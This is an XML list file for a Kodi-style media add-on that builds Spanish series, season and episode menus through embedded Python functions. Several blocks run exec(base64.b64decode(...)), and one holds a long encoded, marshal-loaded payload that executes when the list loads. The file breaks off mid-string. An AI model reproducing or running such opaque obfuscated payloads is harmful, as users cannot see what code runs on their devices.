<?xml version="1.0" encoding="UTF-8" standalone="yes"?>





<item>
<title>[COLOR orange]BUSCADOR [COLOR white]Series [/COLOR] </title>
<link>$doregex[makelist2]</link>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</title>
<info>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</info>
<link>$doregex[temp]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>temp</name>
<listrepeat><![CDATA[
<title>[COLOR white][temp.param1] [temp.param2][/COLOR]</title>
<info>[COLOR white][makelist2.param3] [temp.param1][/COLOR]</info>
<link>$doregex[cap]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
serie = '[makelist2.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>cap</name>
<listrepeat><![CDATA[
<title>[COLOR white][cap.param4] [cap.param3][/COLOR]</title>
<info>[COLOR white][cap.param1][/COLOR]</info>
<link>$doregex[link_final]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
temporada = '[temp.param2]'
from resolveurl.plugins.lib import jsunpack
from datetime import datetime, timedelta
import time
import re,requests,xbmc,random,urllib2,xbmcgui,base64
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<listrepeat><![CDATA[
<title>[COLOR white][link_final.param2] [link_final.param3] [link_final.param4] [/COLOR]</title>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[cap.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUJRQUFBRUFBQUFCemlRQUFBR1FBQUdRQkFHd0FBRm9BQUdRQUFHUUJBR3dCQUZvQkFHUUNBRm9DQUdRREFGb0RBR1FFQUZvRUFHUUZBRm9GQUdRR0FGb0dBR1VIQUdRSEFJTUJBR1VIQUdRSUFJTUJBQmRsQndCa0NRQ0RBUUFYWlFjQVpBb0Fnd0VBRjFvSUFHVUhBR1VKQUdVQUFHb0tBR1VIQUdRTEFJTUJBSU1CQUdRTUFHUU5BSU1EQUlNQkFBRmtBUUJUS0E0QUFBQnAvLy8vLzA1MHR4VUFBRWw1UW14aWJVNTJXa2RXYTBsSFNqVkVVVzlxU1VWYVZWSjNNRXRFVVhCd1lsaENkbU51VVdkWmJVWjZXbFJaTUV4RFFqWmlSMnhwVEVOQ2FtSXlVbXhaTTAxelNVZEtjR0p0Um5wWk1teHdSRkZ3ZEdJelNuZGhSMVl4WTNsQk9VbERZekpPVkZKb1RucHJNMDVFV1RGTmVrVXpUbFJWZDA1dFdYcE5SR040VFhwWmVrNVVXVEpPZWxVeFRucE5OVTV0VlhsYWFsVTFUWHBCTWxwVVdteE9WR3Q2VFhwVk1FNTZSVE5PUkZFeFRsUkpNazE2VFROT01rVjZUbnBWTlUxNlFURk5SRlV5VGtkSmVrNUVZek5PUkVrd1RYcFZOVTU2VFRCTmFsSnJUa1JSTTA1cVkzaE9SRWw1V1dwamVrNVVUVEphUkZwc1RrZFJlazlFVVRST1ZHc3lXV3BTYUUxNlJUQmFhbEpxVG5wSmVWcHFTbWxPZWtrd1RXcFZNazV0U1RGT2FsVXlUWHByZWsxRVVteE9SMFV6VFZSUk5FNVVWVEZOZWxwcVRtMU5NRTFVWXpST1JHY3dUV3BaTUUxNlkzbFphbU42VGpKRmVWcHFWVEZPYWxrelRtcE5NVTE2UlROT2FrcHBUbXBaZWsxNlRUTk5iVWt5VG1wak1FNTZXVE5OUkVwdFRYcGpNVTlFVlRSTmJWbDZUbnBhYUU1NlVYcE5SRlUwVG1wcmVWcHFXVEpPZWtrd1dYcGplVTE2WTNsWmFrMDBUbFJaTWs1cVZUUk5lbXQ1V21wWk1VNUhXWHBOZWsxM1RXMVpNRTlFWXpKTmVsVjZUbXBaTWs1SFJURlBSRTE2VFhwak1sbFVXVFZPZWxreldWUmpNazU2V1hsYWFrMHhUbFJOZWsxNldUQk5iVmt6VFdwTmVFMXRXVEZOUkZwb1RYcGplazU2U20xTmVtdDZUMVJaZVU1cVdUSk9hbFpvVGxSUmVWbHFTbTFPYlZVelRWUmplVTVVV1RGWlZFcHBUbGRGTTA1RVZYcE5iVWt5V1dwUk1rNVVWVE5QVkZreFRYcFpNRTVxVFRWT1IwMHdXbFJOZDA1dFNYcE5WR041VGtkTk1GbFVUWGxPYlZrelRXcGFhVTF0V1hwT2VrcHBUbFJqTWs1RVNtbE9hbXN6VDFSTk1rNUVaekpOVkZwb1RrUlpNbGxxWXpWT2FrMHdUbFJSTlU1NldYcFBSRTE1VG1wWk1VNUVZekJOZW1ONlRWUlJNRTVYUlhsYWFsRXlUbnByTWs1RVkzZE9hazB3VGtSTk0wNXFTWHBPYWxKdFRXMVpNazFxVlRKT1IwVXpXVlJqTTAxdFdURk9lbEpzVG1wTk1rMVVXVEZPTWtWNlRsUlNiVTVxVVROT1JGRjRUbXBWTTA1cVdYaE5la2t4V1ZSTk5VMTZTVEJQVkZwclRucFplVmxxVlRST1ZHTXdXV3BqTUU1dFVYcFBSR041VG0xWk1rMXFWWHBPVkdjeVdWUmFhMDU2UVROT2FsVjZUbTFaTWs5VVVUTk5lbXN5VGxSVk1rNUVZekpQVkZKb1RtcEpNRTVFVlRWT2Fsa3pUVVJTYVU1NlRUQlBSR1JvVGtSck1rOUVUWGhPVkZVd1dWUlZNMDE2VFRKWmVsRjVUa2ROTWs5RVNtMU9SMUV3VG1wV2FFNUVVWHBQVkdONFRtcEZNRTU2WXpWTmVsa3dUWHBWZWs1NmF6QmFSRkY1VFhwWk1FOVVZelZPZWxrelQxUlZNRTVxWTNwTmVsVjZUbFJaTUZwRVZUTk9iVkV4VGxSUk1VNUhWVE5OVkdONFRrUk5NRTU2VFROT2Vra3lUMVJqZDA1NlFUQlBSRkUxVG5wSk0wNUVUVEpOZW1jelRWUk5NVTE2VVRCT1JGcHRUbXBaTVU1cVdtMU9SMUY2VG5wamVFNUVZekJPYWxVd1RucEpNMDFFWXpWT1ZFMTZUbXBOZUUxNll6Rk9hbHB0VGtkWk0xbFVWVEpPUkZVeFRVUlZNMDU2U1RGTlZHTXlUbGRGTVZsVVdtbE9WR2N4VDFSamVVNHlSWHBQUkZVeFRYcFZlazFxV1RCT2VsRXpUVlJWTVU1SFdUSk5hbEpwVGtSck1VMVVUWGRPYlUweldWUmpNRTE2VlRGT1ZGSnBUWHBuTWs1cVVUSk5lazB5V21wU2JVMTZSVE5OVkdNeVRrUkpNVmxVVFRGT1JGRXlUMFJSTUU1VVl6Rk5lbU41VGtSSmVWbHFXbWxPZWtVeFdWUlplRTE2UVRKTmVsSnNUbnBGZWsxRVZYaE9SMWt4VFhwak1FNUhWVEJhVkZWM1RucEpNRTE2VFhwT2Vtc3dUVlJOZWsxNmF6QmFhbGt4VGxSUmVrMXFXbXRPZWxVeVRYcFNhMDVFV1hwTmVsSnRUbXBSTTAxVVVtbE9iVWt5VFZSVmVrNTZWVE5PVkZWNFRtcEpNRTFVWTNsT2VtTXhUMVJqZUU1dFNUSlBSR040VGtSWk1rMVVVbWhPZW1Nd1RrUmpNazVVVlRKT1JGSnRUbFJWTWs1RVkzcE9SR3Q2VG5wYWJFNUhTWGxaYW1ONlRucGpNVTlVVVRKTmVrVjZUVlJTYTA1RVJYcE9lbGw2VFhwak0wOUVUWGhPUkVWNlRWUk5lazVxV1RGTlZGSnBUbXBaTUU1RVdURk9lbEV3VFZSWk1rMXRXVEpaYWxGNFRsUkJlazVFVW1sT2JVa3lUbnBaTWs0eVJYcFBSRkpyVG1wVk1WbFVUWHBPVkVFd1RtcFNiVTVVV1RKTlZGVXpUWHBWTUZsVVVYaE9WRmt4V1ZSU2FFNVVVVEpPZWxGNVRsUkJNRmxxVW1sT1ZGRjZUMVJqTTA1cVdURk9hbEpwVGtSVk1scEVXWGhPYW1jeVdWUktiVTVVUlRGT1ZFMHlUbTFSTWsxNldtaE9SMDB3VDFSa2FFNTZaM3BOZWxVelRsUmpNbHBxVFRCTmVsRjZUVlJOTkU1dFZUQk5hbGt5VFhwck1sbHFXVEpPUkUwelRrUlZNMDVIV1hwT1ZHTTFUbnBOTUZsNll6Sk9SRmt3VDFSU2JVNXRVVEpaYWswd1RYcG5NMDVFVFROT1ZFVjVXV3BOTkU1RVdYcE9lbFY0VG5wbk1VOUVWVFJOZWxFeVdWUmpNVTVxVVRCYWFsSnRUbnBWTUU1cVRUTk9SRkY2VFVSVk1VMXRTVEJQUkZrd1RXMVpNMWxVU20xT1YwVXhUMFJqTlU1RVNURk9hazEzVG0xUk0xbFVZM2hPUkdNeVRYcGpkMDV0VFROTlJFcHRUbXByTVU1RVVtbE9lbU13VGtSTmVrNXRXVEJPYWxVd1RsZEZlazVVWTNsT1JHY3pUMFJTYVU1NlRUTk5SR00xVFhwUk1rNUVVbXhPVkdzd1RsUk5ORTU2WXpGT1ZGa3lUbXBWTVUxVVdUTk9hbGt5V2tSUk5VNXFUVEpaYWxrelRrUlJlazVVWXpWT2Fra3hUbFJTYWsxNll6Rk5WRlV4VFhwVk1GbHFUWGxOZWxVd1RucFZkMDU2VVROTlJGSm9Ua1JGTWxsVVpHaE9hbWQ2VDFSUk5VNUVSWGxhYWxwclRrZE5NMDVFVVRST2VtTXpUMVJaTkUxdFdUSmFhbFUwVG0xWk1GcHFXWHBPUkVWNVdXcGFhMDVFV1RKUFJFcHBUbnBKTTAxVVRYZE9lbU13V21wS2FVNVVWWGxaYWxwb1RtMUpNbGxxVlRGT1ZFVXlUWHBOTlU1RVVUSmFSR015VGtSck1WbFVWVEpPVkdONlRrUk5lRTVFYTNwUFZGRjVUWHBKZWs5RVVtcE5lbU14VFZSWk1rNXFXVEJPYWxwdFRtcG5lazVVVFRGT1JHZDZUbnBqTkUxNlNYcE5SRkV3VGxSQk0wNVVVbWxOZW1zeVdWUlZNVTVFU1RKT2FtTXdUa1JGTTAxVVRYZE9WRlY2VG5wUmVFNVVaM3BQUkZFd1RYcFZNRmxVVVRKT2JVa3pUWHBSZWs1cVRYbFphbHB0VFcxWk0wOUVWWHBPZWxrd1RYcFpNVTVFVFRKT2FsRTBUa2ROTUU5VVRURk5lbXN3VGtSUk1FMXRXVEphVkZGNFRXMVpNazVVVVRKT2VrMTZUbFJqZWs1SFVUSk5lbHBwVG1wbk1rMXFZek5PYW1jeFQwUk5NazU2YXpCTmFsRTBUbFJKTTAxNlkzaE9hbU14VG1wak5VMTZhekpOVkZKc1RrUlJlazFxV21wT1ZFMHlXVlJhYlU1RVZURlBSRmw1VG5wRmVrOUVVVEJOZWtVeFQxUlpORTF0V1RGT2Vsa3pUa1JOZWsxNll6Qk9hbEY2VFhwUk5VNUhVWHBQVkZVeVRtcHJlazU2WTNwT1JGa3hUVVJaZVU1RVJYcFBWRlY0VGxSak1rNXFZek5PTWtWNlRtcFZNRTU2VVRCUFZGbDZUWHByZWs5RVVUSk9lbWN6V1ZSVk1rNXFUVEJPYWxreFRrUlZNMDVFV20xTmVrMHhXVlJTYlU1RVNUQk9WRnBwVGtSRk1rNXFZekJPYlUweVRXcE5NMDVFU1RKT2FrcHRUa1JOTWsxcVRUQk9hbU13V1hwTk1VNVVSVEZPYWxreFRrUlJNMDU2VVRCTmVsa3lUWHBWTVU1cVdUQk9WRXBwVFhwak1FMXFWWGRPYWxrd1RtcFpNVTE2U1hsYWFsbDZUa1JqTUU1cVZUUk9SRWw1V21wUmVFNUhWWGxhYW1NMFRtcGpNazU2V1RKTmVtY3lUMFJaTlU1VVVURk9SR014VGtSVk0wNXFXbXRPUkdNeVRtcGFiVTVIV1RCYVJGRjRUa2RaTWsxVVdtcE5la2t6VGtSVk5FNUhXVE5OUkVwcFRucHJNbHBVVFhwT2Vra3lUV3BWTUU1cVRUTk9WRkV5VFhwWk1FMXFXVEpPZWxVeVQwUlNhRTE2UVROUFZGSnRUbXBuTWsxcVRUSk9lbXN3VDBSak1rNXFSWHBPYWsxM1RrUm5NbHBFV214T2JVVXpUbFJTYkUxNldYcE9WRnBwVGtSVk0wNXFXVEZPYW1NeFRrUlplVTU2VlRKYVJFMHhUa1JSTUU1NldUQk9WRVV3VDFSTk1VNTZZekJOYWxsNVRYcEJNMDVVVlRWT1ZFRXdUbFJLYVUxNlNUSlBWR1JvVG5wUk1FMVVTbTFPZWxFelQwUkthVTVFU1RGT1JGcHBUbFJSZWs1NlVUVk9SRTB4VDBSamVVMTZUVEZPVkdNeVRtMVpNRnBVV1RKT1ZFVXdUbFJOTkU1cVl6Rk5lazB3VG5wWk1FMVVZM2xOYlVreFRWUlJNMDE2WjNwT2FsRXpUVzFaTWxwRVVUTk5iVmt3V1hwak1VNTZZM3BOYW1OM1RYcFplazFxVlhoT1ZGa3pUVVJqTTA1NlNUQk5hazEzVFhwRk1sbFVXWHBPVkdzd1QwUlpNRTVxU1hwUFZFMHpUa1JGTWxsNlRYcE9SRlV4VDFSTk5FNUhXVEphUkZwcFRtMVplazE2U21sT1JFVXlXVlJqTTA1VVFYcFBWRkV5VG0xVk1VMTZZM2xPUkdzeVQxUmpNazVFU1RGTlJFcHBUbFJOTUUxNll6Sk9WRWw2VG5wTmVrMTZRVEZOVkUweFRtcE5lazFFVVRGT1ZHZDZUbnBrYUU1VVFUQk9WRlpvVFhwQk1VOVVUVFJPUkdNd1dYcFZNMDF0V1ROT2VsRjVUbnBaZVZscVkzcE5lbGt3V2tSWk1VNXFSVEZQUkdONlRXMVpNMDVFV1RCT1ZGRXpUMFJSTlUxNlVUQk5hbEpyVGtkRmVrMTZZekZOYlVreVdYcGpkMDU2U1RGWlZGa3lUa2ROZWsxcVVUVk5lbWN6VFhwVk5FNVVZekpOZWxKcFRrUkZlazVxVFRCT1ZGRjZUVlJOZUU1RVJYcFBWRTB6VGtSSk1GbDZUWGRPUjFVelRYcGpOVTE2WXpKYVJGRjRUbXBaTTA1RVVURk9SRTE1V21wWk0wNTZTWHBPYWxsNlRtMUpNMDVxWXpOT2Ftc3lXWHBqZVU1cVp6Sk5lbFpvVFhwRk1FNXFTbWxPZWtVeVdWUlpORTVVUlROWlZFMHpUbFJSTWxsVVZYaE9lazB5VFhwU2FrMTZTVEpaZWxrMFRrUkpNMDVVV1RCT1IwMTVXbXBWTkU1VVFUQk5hbEV5VG1wVmVrOVVVVFJPZW1jd1RrUk5lazE2VVRGTmVsVXpUbFJKTWxwVVkzcE9hbWN4VFVSWmVFNXFVVEJhUkZsNlRtcEpNMDE2VlRWT1JGRXlUbFJSTlU1cVRUSk5hbFY0VGtkTk0wOVVVbXhPYlZFeVQxUlJORTVxUlhwT1JGWm9UbTFGZWs1NlZYcE5lbXQ2VG1wTmVrNUhXVEpQUkZKcVRYcHJNRTFVVVRKT2JWRXlXa1JSTTA1NldUSmFWRlV3VFhwWk1FOUVXVEpPYlVrd1dYcFplVTU2UVRKYVZHTTBUbnBCTTA5VVRUUk9SMWt5V21wS2JVMTZaek5aVkZKb1RYcGpNVTVxVVRKT2VsVXpUbFJWTkUxNlVURk5SRTAxVG0xSk1GcFVTbTFPYlVVd1RrUmpNazVVVlRGWlZFMDBUbnBKZWsxNll6Qk9SMGt3VFZSU2FFMTZhekpPZWxwcVRtcFZNbGxxWXpOT2VsbDZUV3BWZUUxNlZYcE9SRTB3VGxSak0wOUVWVE5PUkVreVdYcGFhVTU2VVRCT2VsVjNUbGRGTUU1VVdUSk5la2t5VG5wTmVFNTZVVEJhVkUxM1RtMVJNbHBVV21oT1IxVXhUVVJOTWs1RVp6RlBWRmswVG5wQk1rOUVUWGxPUkdkNlRucFNiVTU2VFRGWlZHTXdUbnByTWxwcVZUTk9lbWN5V2tSak1VNXFVVEJQVkdNMVRrUnJNVTlFWXpKT2Vsa3hUVlJrYUU1cVJUTk9SRTB5VG5wQk1VNVVZelJPZW1kNlQxUmpNRTVFU1hwT1JHTTFUbTFGTUU5RVl6Rk9SR3Q2VFhwTk1FNTZVWHBOYWswd1RrUm5lVmxxV1RCTmVsbDZUMVJSZVUxdFdURk5WRnBwVG0xWk1FMXFWWGRPUkVsNVdXcE5ORTVFWTNwT2VrMHdUbXBOTUUxNlNtMU9iVmt5V2xSVk5VNTZVVEJQUkZsNFRtcGpNazFxVFRWT2JVVjZUMVJhYTA1NldUQk9WRkV4VFhwbk1scHFWVEJPYWxWNlRYcE5NazVxWXpCWmVtTTFUa1JKTUZsVVl6Vk9iVTB6VFVSVmVFNVVaM3BPZWxWM1RtcGpNRTE2WXpKT2FsVXdXV3BrYUU1VVZUSlpWRmw1VG5wUk1FMTZWVFJPYWtVd1RtcFNiVTVIU1RCUFJGcG9Ua1JGTWsxNlRUSk9SRmt6VG1wUmVVMTZTVEpPVkZwb1RXMVpNVTlFV1hoT1ZGRXpUVlJSZUU1VVFUTlBWRnBvVG0xUk1FMXFUWHBPTWtVd1RYcFpNazE2UVRCWmVrcHBUWHBGTWsxcVdUUk9hbXQ2VFhwU2FFNXFWWHBOYWsxNFRsUnJNRmxVVFRGT1YwVXlXV3BWTWsxNll6QlBWRTB4VFhwbk1FMTZUVFJPVkVreFRXcEthVTVxYTNsYWFrcHBUa1JyZWs5VVdUVk9lbFV5VFhwYWFrNXFTVE5OVkVwdFRYcHJNRTU2VlRST2VrVXlUbnBSTkU1WFJUQk9hbGt4VFhwWk1FMVVVbXBOZW1kNlRtcFZORTVxVlRCTmFsVXdUbnBCTWs1RVRYbE9hbXN5V2xSVmQwMTZWVEpPYW1ONlRucEZNVTFFVFRWT2VrRXlXbXBrYUU1dFZUSlplbGt6VG0xRk1rNXFXWGhPYlZFelRVUlZOVTE2VFROT2FsazFUbnBqTWs1NlNtMU9hbU15VG1wak5FNVVXVEpaYWxwcFRucE5NRTFxWXpGT2VrVXlUbnBWZDA1NlVUSlplbHBvVG1wSk1VNVVXWGhOZW1ONlRrUlpNMDVVV1hwT2FtTTBUbTFWTWxwVVVUVk9SRkV5VGxSUk5VNUVSVEpPUkZWM1RucG5lazFVWXpKT1JHc3dXWHBaZUU1VVZYcFBSRnByVGtSbmVWcHFXbTFPYlZWNlQxUlZlRTVxU1hwT1JGazFUbTFGZWsxRVVYcE9ha2t5V1hwYWEwNTZVVEJhUkZKc1RrUlZNbGxVV214T1YwVXpUa1JqTVU1cVNURk5la3B0VGtSTk1scFVZM2xPUkVsNVdXcFZOVTU2WnpKWlZGSnFUbnBWTVUxVVVtcE5iVmt5V2tSYWEwNUVVWGxaYWxrMFRrZFZNMDlFV21oT1ZFRXpUbFJSTkU1RVdUQlBSR04zVG1wak1GbDZVWHBPUjFVeVRrUk5OVTVIUlRKT1ZGbDZUbXBOTVUxcVRURk5lbGw2VGtSa2FFNXRVVE5PZWxFelRYcG5NazlFVW14T2VtZDZUVVJOZWs1dFVUQk5WRTAxVG0xWmVrMTZUVE5PVkVreVdWUk5NVTVFWXpKT2FsVjZUbFJyTUZscVRURk5lazE2VFhwUk0wNUhSVE5PYWxrelRYcE5lazVFWXpST2Vsa3pUVVJTYVU1NldUQk5WRkV6VG5wTk1VMXFXbXhPVkVreFRrUk5OVTU2WjNsWmFsRTBUbTFOTWs1NldUSk9SRlV4V1ZSWmVrNTZWVEpaVkZGNlRXMUpNMDU2VVhwT1YwVXlXbXBWTUUxdFNURk5WRlYzVG1wTk1VMXFWVFJOZWxreFdWUlpORTR5UlRCUFZFcHBUa2RWTTA5VVdtaE5lbU15VDFSUk1VMXRXWGxaYWxGNFRucFpNazlVVVRST2FsVXpUMFJTYUU1dFJURlBSRkpxVGxSRk1rNVVWbWhPVkVVelQxUmpORTV0VFRGTlJGcHJUbXBOTWsxNlkzZE9lbFV5V21wU2JFNHlSVEpQUkUweFRYcEJlazVFVFhkT2FtY3hUV3BOTWs1WFJURlBSRTAwVGtSbk1GbDZZelJPYWxFeFRXcGpORTVFU1hsYWFsa3dUa1JKZWsxNlNtbE9lazB4VDFSak5FMTZTVEpaZWxFMFRucEJNVTlVVFRCTmVtdDZUVlJSZUU1NldUTlBWRnBvVFhwQk1VNXFUVFZPVjBVeVRtcFZNRTU2U1RKYWFscHJUbFJOTWsxNlkzZE9lbGw2VG5wUk5VNUhWWHBOZWxKclRtcEZlazU2Vm1oT1ZGRjZUbXBTYTAxNlJUSk9WRTB5VGtSSk1sbHFXbXhPZWtFeFRXcE5lVTF0V1RKTlZHTjVUbXBuTUZsNll6Tk9WR016V1ZSUmVFMXRTVEJhUkZFeVRYcFpNazU2VVRST2Ftc3dUV3BaTUU1cWF6Qk9SRmt3VG5wSmVrNVVVVE5PYWxreVdrUldhRTVVVlhwTmFsRTBUakpGTWxwVVl6Rk9SMUY2VFZSTk5FNTZZekZOYWxwb1RrUk5NazVVWXpOT1JHdDZUMVJhYlU1VVp6RlpWRkUwVG1wWk1VMVVTbWxPYWswd1QxUk5lRTVxVVRCT2FrMTRUbFJGTWsxVVZUQk5lbFV5VFdwS2FVNXFaek5PUkZwb1RrUlpNVTFFVW0xT2FtdDZUWHBhYlUxdFNYcE9SRkpzVG5wTk1WbFVZekpOZWtreVQwUlpNVTU2VlROT1JGWm9UVzFKTTA5VVdYbE9la0V3VG5wU2EwNTZSVE5aVkZsNVRtMUpNMDFVVW0xTmVrRXdUMVJaTVU1NlJURk5SRmw2VGtkRmVrMXFVbXRPYWxFd1RtcFZNVTE2VFRKYWFsRjZUakpGTWxwcVkzUzNGUUFBTVZwdGRERkNVVnBzUVZSRU1FRlJjRE5CUjNRelduZEZkVUZ0UkRKQmJVVjFXbnBXTUVKSFRERkJiVm93UVcxTU1FRjNUREJDVVhBeFFWRjRiVnB0V2pOQlZGWnRRVWRhYWxwdFdqTmFVVXhyV20xRU1rMUhTR3RCVVZJeVFYZElha0Y2U0RKQlIwMTFRVEpTTUZwM2NERkJTbEl5UWxGRU5FRkhXakphYlhBd1dtMU1Na3gzVFhsQlIxWXlXbmRNTkVGSFRqRkJiVVYxUVVwU01WcHRjREpCZWt3elFWRmFNVUZ0V2pGQ1VVd3dXbnBNTWsxM2NESkJVVXd5UVcxTWEwRlVURE5hUjFvMFFYZHdiVnB0V214QmJVUXlXbmRNTTBGVVNHMUNSMDEyUVZGYU1rRjNTRE5CZWtodFFYZElNMEZIV2pKQlVVUnNRWHBJTWt4dFNHdGFla3d6V20xd05GcDZURE5hUjBSdFFXMWFNRUZ0VFhwQlIwUnNUWGR3YWxwdGNETkNSM0F5UVZGd01reDNWM1pCUjFJd1dtMVhla0YzZERCYWQwMTVRWGRFTVZwUldqQkJVVVF3UVZGSU5VRjNkREZCVVhGMVFWUk1Na3gzY0d4QlNsSnRRbEZ4ZFVGUlZqSk1SMFExV20xNGJVRlJXakZhYlVReFdrZGFNbHB0VGpGQ1VVUXpRWGRXYlVKSFJHMUJVVll6UVVkYU1rRkhWak5hUjBRMFFYZElNMXB0U0d4YWJVZ3pRVWRNTlZwdGNETk1SMDE0UVZSYWJVSkhSR3hCYlVSdFdtMUZla0YzZERKTlIxcHRRVWQwTVZwSFJYVmFlbFl6UVVkRWJFRkhURE5CZDNBeFFWUlNNMEZ0Y1hWQmQzQXlUWGRNYlVGSFJHMUJiWEExUVhkV2JWcFJSRFJhYlhBd1FsRndiVnB0ZURCYWQwaHFRWHBFTUZwM2NERkJiVnB0V20xSU1GcHRkRzFhVVZwdFdtMUVNRUZSVjNaQmVsSnRXbTFNYTBGNlVqTmFSMW95UVVkT01reDNSRE5CZDBodFdsRlhla0ZVVERKTVIwMTVRWHBXTUVKSFRERkJiVll5V2tkd05FRlVWakphYlV4clducFdNa3h0V2pSQmJVNHhXbEZhYWtGdGVHMWFSMHd5V20xRU1FRnRjREpCYlZZd1FsRk1Na0ZLVWpGQmJYRjFRWHBhTUUxSFRERkJWRll3VEhkRWEwRnRSR3hNZDBWNFFYcEViVUZ0U0d4QlZFaHRRVWRFYkZwdFdqQkJiVnB0UVZSV01FRnRSREZCUjA0eFFVZEVhMEZVVERCYWJVd3hXbTFTTWtGUlRHdEJkMHh0UWtkSU0wRkhjREpCYlZveVFWUkVNMEpSY1hWQmQzaHNUWGRJTlVGM2RHMWFVVVJ0UVhkTU1VRkhSWGhhZWt4dFFYZGFhMEZSVEROQmQxcHJRWHBhTWtGdFNEUkJWRVF5VFVkYU1FRnRjREZhVVUxM1FWUkVNazFSY0d4QlVVZ3dUVkZKZFVGdGVHMWFiVVJzUVhkRWJWcFJTREpCZDBodFdsRmFiVnB0VGpCQmQxZDJRVEpTTVZwUlYzcEJkMW93UVZGWGVscHRUakZhVVVSclFYcElNRUZIUkd4QmJVUXpXbTFNTUZwdFRERmFkMHd4UVhkRU1GcDNUWGRhYlZvd1RHMU5la0ZIVmpOYWQzQnFRVzEwTTBGM1RYcGFiVVF3UVZGTU5VRlVVak5hYlVneVdtMUlNVnBIVjNwYWJYQXpXbmRhYlVGSFZtMUNVVXhzUVcxU01FRkhXbTFCZWtnd1drZFhlbHA2VmpCTWQxbzBRWGRTTWsxSGNEVkJVVll6V25kTmRVRlJTR3hNZDNBMVFWRndiVUpIU0RGQlIxb3hXbmR3TWtGM1JEQk1SMFEwUVhwYU1rRkhUR3RCZDB3elFWRkliVUYzVmpOYWQxb3hRVlJTTUV4dFdteEJNbEl5VFVkeGRVRlVXbXhNZDNCcVFVZDBiVUpSUlhoQlIzaHRRbEZGZWtGdFVtMUNSMW8xV25wTWJFMTNUREZCUjNReVRFZFhla0YzU0cxYWJWcHNXbTE0TTBGUlJETkJNbEl5VFVkSWJFRjNjRE5DUjBRMVducE1NVnAzV214QmQzQnRXbmRNTTFwdGNERmFiVm96UVVkV01rSlJSWFpCZDFJeldrZElNa0ZSZERGQ1VYQnNRVXBTTVVGM1NEUkJkM2hzVEhkSWFrRkhlRzFDVVhBMVFVZHdiVnBIU0d0QlZFd3pXbmROZVZwdFVqRkJVWEF3UVZSU01rMVJUREJCUjB3eFFsRklNMEZSVEd4TWQxcHJRVzF3YlZwdFJESkJkMFJ0UVZGRU5GcHRlRE5CUjBReldtMXdNMEZSV2pSQlVYZ3pURWR3TkVGdGREQk1SMGd5UVVwU01rRnRjR3BCUjA0eFdsRk1iRUZSVWpCQmJWZDJXbnBNTTBGdFJYWkJkMUp0UVhkd05VRnRjRzFDUjB4clFYZEVNVXhIV210QlNsSXlURzFKZFVGUlREQk1SMDE2UVhkNGJWcDNUREZCVVhneFFWRmFNVnB0VWpGQ1IzQnNRVlJXYlZwM2NHMUJkMFJ0UVcxRmVGcHRlRzFCVVUxMVFYZDRiVnAzVERWQmVsSnRXbmR3TWtGUmVHMUNSMXBxUVhkU2JWcEhSWFpCUjFvd1RFZEVNVUY2VmpCTmQwMTZRVkZFYkV4M1dqVkJiWEF3V25kWGRscHRSRE5DUjNCdFFWRmFNa0pIV20xQmJWb3pRVzF4ZFVGdFRteE5kMHd6UVhwSWJWcEhSRE5CYlhneFdsRk1NRnB0UkcxQ1IwZ3lRVWR3YlZwR2NFRlFZVVZzYmtvMVkzRlZlSFJEUms1aGNFaE5Oa0pUVTIxd1NGSTBTVWRFTTBKUlYzWk5Ta1JxUnpGNU1VaElWek5JZUZJMVJ6Qm1NMjVKUVcxSFNqRmpjREI1TTBwVlQyUnVNRk14YmpOVFptNUhTVmhGU2xObVRIbFhkWEI1VjFkQmJYVlBXakpCWlVsNWNEVk1TbGRRYjBkMVJFRkhjVEJFTUVGNlJWVlRaa0pVT1dsR2VsTkpSWGRCU1c5S09YWnhTSGxsU0ZKRVpVZ3dRVk5KYlU1clFrZHhTa3h0V2pCTVNqRmtSMHRQUlZnemNVMUZWWGxUY2xSRlZuSjNUbXh4U1dOYWNGRndORTE1UkdwS2QzbG5TSHBOYkVkaGNVUnVlbWRhU1VkUFJsZ3llVWhZTUZkc1JsSm5VSEJMVFcxSU0wRjVjRXBKV0V4NlFWVkNWVVZ0Y0VsMFpVMVNjVXRaYlhGYVJuZ3hZVWhJZVhkR2VGZHVRbEZCU2tkNmVVcGFlbXBwU1hnNFpVVXpVMVpCZDNGblRWTndNa3BVYXpOd01EZzFiMUpOZVZnd05HbHZWRWxWVFVwWFpFaFRXbWxhVWpobGNETklNVVY0Y1dSd01GZDJiMjExZDFvd1FVUkVlVmRKVFZORU0zRjRRWGR1TUdJeGJqTnhVbTlIZURCRlIxWnJURWRUUlVKTGVXVndZVk5zUmtwTWFuRnRkVkJJVkhBMFNXRkJaMXA2WWpWd1ZVaHJUVk5KTlVoSVdtcElTM0F4UWtkVFIweExSWGRhTUdkRFJHeG5VbkF5ZFZwRWVsZFBUVEJFTTFwS1oySkZVMDlpY1RCck1FZDZPWGhNZUd0dWNIaEZTM0IzUVhsR1VrbFhTREpyVFc5NGVVeHZTRWxvUjJ3NVowVjVTVmhGVlhsa1JuZE5SRUpLVjB0QmVVOWhTVVk1YWtoNF